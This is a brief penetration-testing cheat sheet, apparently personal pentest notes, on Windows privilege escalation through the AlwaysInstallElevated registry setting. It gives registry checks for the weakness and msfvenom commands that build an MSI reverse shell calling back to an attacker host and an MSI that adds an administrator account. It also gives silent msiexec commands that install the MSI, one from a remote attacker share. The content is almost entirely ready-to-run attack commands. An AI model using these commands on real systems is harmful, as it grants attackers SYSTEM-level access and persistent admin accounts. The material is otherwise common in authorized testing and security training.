---
tags:
  - Exploitation
  - Foundational
  - Post_Exploitation
  - Privilege_Escalation
  - Windows
---

## AlwaysInstallElevated Exploitation
resources: [HackTricks AlwaysInstallElevated](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated)

> [!info] When both HKCU and HKLM AlwaysInstallElevated keys are set to `0x1`, any user can install MSI packages with SYSTEM privileges.

### Verify Vulnerability
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Generate Malicious MSI [Local]
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KaliIP> LPORT=<PORT> -f msi -o shell.msi
```

```bash
# Alternative: add user to administrators
msfvenom -p windows/adduser USER=<Username> PASS=<Password> -f msi -o adduser.msi
```

### Install MSI [Remote]
```cmd
msiexec /quiet /qn /i C:\path\shell.msi
```

```cmd
msiexec /quiet /qn /i \\<KaliIP>\share\shell.msi
```
